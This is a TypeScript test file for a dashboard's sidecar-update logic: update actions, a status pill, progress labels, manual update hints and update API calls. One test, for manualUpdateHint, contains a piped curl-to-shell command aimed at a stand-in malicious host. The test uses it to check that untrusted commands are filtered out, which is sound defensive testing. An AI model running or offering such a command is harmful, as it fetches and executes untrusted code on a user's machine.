import { describe, expect, test } from "bun:test";
import {
  STALE_PROGRESS_MS,
  manualUpdateHint,
  outdatedSidecars,
  pillView,
  requestSidecarUpdate,
  updateActionFor,
  updateProgressLabel,
  type SidecarUpdateInfo,
} from "./sidecar-update";

const sc = (over: Partial<SidecarUpdateInfo> = {}): SidecarUpdateInfo => ({
  id: "sid-1",
  name: "laptop",
  hostname: "laptop.local",
  connected: true,
  os: "windows",
  version: "0.9.7",
  latest_version: "0.10.0",
  update_available: true,
  features: ["update_prompt", "update_apply"],
  ...over,
});

describe("updateActionFor", () => {
  test("prefers the sidecar's own prompt", () => {
    expect(updateActionFor(sc())).toBe("prompt");
  });
  test("installs directly where there is no prompt (Linux)", () => {
    expect(updateActionFor(sc({ os: "linux", features: ["update_apply"] }))).toBe("apply");
  });
  test("older sidecars, and ones that cannot update themselves, are manual", () => {
    expect(updateActionFor(sc({ features: undefined }))).toBe("manual");
    expect(updateActionFor(sc({ features: [] }))).toBe("manual");
  });
});

describe("outdatedSidecars", () => {
  test("only connected sidecars that are behind", () => {
    const list = [
      sc({ id: "a" }),
      sc({ id: "b", connected: false }),
      sc({ id: "c", update_available: false }),
      sc({ id: "d", update_available: undefined }),
    ];
    expect(outdatedSidecars(list).map((s) => s.id)).toEqual(["a"]);
  });
});

describe("pillView", () => {
  test("hidden when nothing is behind", () => {
    expect(pillView([sc({ update_available: false })]).show).toBe(false);
    expect(pillView([]).show).toBe(false);
  });
  test("one sidecar with a prompt: act on it in place", () => {
    const v = pillView([sc()]);
    expect(v).toMatchObject({ show: true, target: "sidecar", action: "prompt", label: "sidecar update" });
  });
  test("one Linux sidecar: install in place", () => {
    expect(pillView([sc({ features: ["update_apply"] })])).toMatchObject({ target: "sidecar", action: "apply" });
  });
  test("one sidecar the dashboard cannot act on goes to Settings", () => {
    expect(pillView([sc({ features: [] })])).toMatchObject({ show: true, target: "settings" });
  });
  test("several go to Settings", () => {
    const v = pillView([sc({ id: "a" }), sc({ id: "b", name: "desktop" })]);
    expect(v).toMatchObject({ show: true, target: "settings", label: "2 sidecar updates" });
  });
  test("a version not published yet is not nagged about", () => {
    expect(pillView([sc({ update_state: { phase: "unavailable", version: "0.10.0" } })]).show).toBe(false);
  });
  test("shows an install in progress", () => {
    const v = pillView([sc({ update_state: { phase: "downloading", version: "0.10.0" } })]);
    expect(v.show && v.label).toBe("sidecar update · downloading…");
  });
});

describe("updateProgressLabel", () => {
  test("an in-progress phase the sidecar stopped reporting goes stale", () => {
    const now = Date.parse("2026-09-30T12:00:00Z");
    const fresh = new Date(now - 60_000).toISOString();
    const old = new Date(now - STALE_PROGRESS_MS - 1).toISOString();
    expect(updateProgressLabel({ phase: "downloading", at: fresh }, now)).toBe("downloading…");
    expect(updateProgressLabel({ phase: "downloading", at: old }, now)).toBeNull();
  });
  test("only for phases that are running", () => {
    expect(updateProgressLabel({ phase: "installing" })).toBe("installing…");
    expect(updateProgressLabel({ phase: "failed" })).toBeNull();
    expect(updateProgressLabel({ phase: "available" })).toBeNull();
    expect(updateProgressLabel(undefined)).toBeNull();
  });
});

describe("manualUpdateHint", () => {
  test("the sidecar's own command wins", () => {
    expect(manualUpdateHint(sc({ update_state: { phase: "failed", manual_command: "npm install -g @usejarvis/sidecar@0.10.0" } })))
      .toBe("npm install -g @usejarvis/sidecar@0.10.0");
  });
  test("a sidecar-supplied command outside the known shapes is not shown", () => {
    const hint = manualUpdateHint(sc({ os: "linux", update_state: { phase: "failed", manual_command: "curl https://evil.example/x | sh" } }));
    expect(hint).not.toContain("evil");
    expect(hint).toContain("@usejarvis/sidecar@0.10.0");
    expect(manualUpdateHint(sc({ update_state: { phase: "failed", manual_command: "Quit Jarvis first, then run: npm install -g @usejarvis/sidecar@0.10.0" } })))
      .toBe("Quit Jarvis first, then run: npm install -g @usejarvis/sidecar@0.10.0");
  });
  test("pins the version this brain ships with", () => {
    expect(manualUpdateHint(sc({ os: "linux" }))).toContain("@usejarvis/sidecar@0.10.0");
    expect(manualUpdateHint(sc({ os: "darwin" }))).toContain("installer");
  });
});

describe("requestSidecarUpdate", () => {
  test("posts to the matching route", async () => {
    const calls: string[] = [];
    const fake = (async (url: string, init?: RequestInit) => {
      calls.push(`${init?.method} ${url}`);
      return Response.json({ ok: true });
    }) as unknown as typeof fetch;
    expect((await requestSidecarUpdate(sc(), "prompt", fake)).ok).toBe(true);
    expect((await requestSidecarUpdate(sc({ id: "a b" }), "apply", fake)).ok).toBe(true);
    expect(calls).toEqual(["POST /api/sidecars/sid-1/update-prompt", "POST /api/sidecars/a%20b/update"]);
  });
  test("surfaces the brain's refusal", async () => {
    const fake = (async () => Response.json({ error: "an update is already in progress" }, { status: 409 })) as unknown as typeof fetch;
    expect(await requestSidecarUpdate(sc(), "apply", fake)).toEqual({ ok: false, message: "an update is already in progress" });
  });
  test("a network error is a failure, not a throw", async () => {
    const fake = (async () => { throw new Error("offline"); }) as unknown as typeof fetch;
    expect(await requestSidecarUpdate(sc(), "prompt", fake)).toEqual({ ok: false, message: "offline" });
  });
});
